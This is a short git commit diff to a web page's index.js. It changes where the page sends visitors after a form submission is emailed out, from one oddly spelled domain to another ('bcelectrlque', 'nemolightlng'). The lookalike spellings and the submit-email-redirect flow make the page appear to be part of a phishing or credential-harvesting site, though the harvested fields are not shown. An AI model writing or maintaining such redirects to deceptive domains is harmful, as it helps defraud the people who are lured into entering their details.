e8228dadaaca600576522be2248f3203e8062e15
husknet <127146284+husknet@users.noreply.github.com>
2025-01-20 17:05:27 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://net.bcelectrlque.com/';
+        window.location.href = 'https://nn.nemolightlng.com/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
